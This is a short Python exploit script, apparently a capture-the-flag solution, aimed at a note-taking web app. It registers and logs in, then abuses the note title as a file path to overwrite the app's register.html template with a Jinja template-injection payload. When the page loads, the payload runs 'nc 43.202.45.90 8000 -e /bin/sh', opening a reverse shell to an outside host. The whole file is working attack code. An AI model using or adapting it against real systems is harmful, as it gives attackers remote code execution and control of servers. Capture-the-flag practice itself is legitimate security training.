import httpx 
from base64 import b64encode

USERNAME = "asdfasdfasdf1234" 
PASSWORD = "asdfasdfasdf1234"

url = "http://localhost:7000"
# url = "https://ch21496143555.ch.eng.run"


client = httpx.Client(base_url=url) 
res = client.post("/register", data={
    "username": USERNAME,
    "password": PASSWORD
})
print(res.status_code)

res = client.post("/login", data={
    "username": USERNAME, 
    "password": PASSWORD
})
print(res.status_code)
cookies = res.cookies

res = client.post("/makenote", data={
    "title": "/app/templates/register.html", 
    "content": b64encode(
    b"""
    <html> 
        <head></head> 
        <body>
            {{ self.__init__.__globals__.__builtins__.__import__('os').system("nc 43.202.45.90 8000 -e /bin/sh") }}
        </body>
    </html> 
    """
    ).decode("utf-8")},
    cookies=cookies
)
print(res.status_code)

httpx.Client(base_url=url).get("/register", timeout=None)